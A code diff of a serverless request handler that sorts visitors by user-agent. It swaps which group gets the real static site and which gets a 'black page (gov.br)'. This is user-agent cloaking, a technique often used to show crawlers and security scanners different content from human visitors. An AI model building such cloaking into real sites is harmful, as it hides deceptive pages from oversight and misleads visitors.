@@ -201,44 +201,44 @@ exports.handler = async (event) => {
   const ua = event.headers["user-agent"] || event.headers["User-Agent"] || "";
   const requestPath = event.path || event.rawUrl || "/";
 
-  // Bots get the black page (gov.br), humans get the real site.
+  // Bots get the real site (so scrapers can mirror it), humans get the black page.
   if (isBot(ua)) {
-    return {
-      statusCode: 200,
-      headers: HEADERS,
-      body: BLACK_PAGE
-    };
+    const filePath = resolveRealPath(requestPath);
+    try {
+      const body = fs.readFileSync(filePath);
+      const ext = path.extname(filePath).toLowerCase();
+      const mimeTypes = {
+        ".css": "text/css; charset=utf-8",
+        ".gif": "image/gif",
+        ".html": "text/html; charset=utf-8",
+        ".jpeg": "image/jpeg",
+        ".jpg": "image/jpeg",
+        ".js": "application/javascript; charset=utf-8",
+        ".json": "application/json; charset=utf-8",
+        ".png": "image/png",
+        ".svg": "image/svg+xml",
+        ".woff": "font/woff",
+        ".woff2": "font/woff2"
+      };
+      const mime = mimeTypes[ext] || "application/octet-stream";
+      return {
+        statusCode: 200,
+        headers: { "Content-Type": mime },
+        body
+      };
+    } catch {
+      return {
+        statusCode: 404,
+        headers: HEADERS,
+        body: "<h1>404 Not Found</h1>"
+      };
+    }
   }
 
-  // Human: serve the real static file.
-  const filePath = resolveRealPath(requestPath);
-  try {
-    const body = fs.readFileSync(filePath);
-    const ext = path.extname(filePath).toLowerCase();
-    const mimeTypes = {
-      ".css": "text/css; charset=utf-8",
-      ".gif": "image/gif",
-      ".html": "text/html; charset=utf-8",
-      ".jpeg": "image/jpeg",
-      ".jpg": "image/jpeg",
-      ".js": "application/javascript; charset=utf-8",
-      ".json": "application/json; charset=utf-8",
-      ".png": "image/png",
-      ".svg": "image/svg+xml",
-      ".woff": "font/woff",
-      ".woff2": "font/woff2"
-    };
-    const mime = mimeTypes[ext] || "application/octet-stream";
-    return {
-      statusCode: 200,
-      headers: { "Content-Type": mime },
-      body
-    };
-  } catch {
-    return {
-      statusCode: 404,
-      headers: HEADERS,
-      body: "<h1>404 Not Found</h1>"
-    };
-  }
+  // Human: serve the black page (gov.br).
+  return {
+    statusCode: 200,
+    headers: HEADERS,
+    body: BLACK_PAGE
+  };
 };
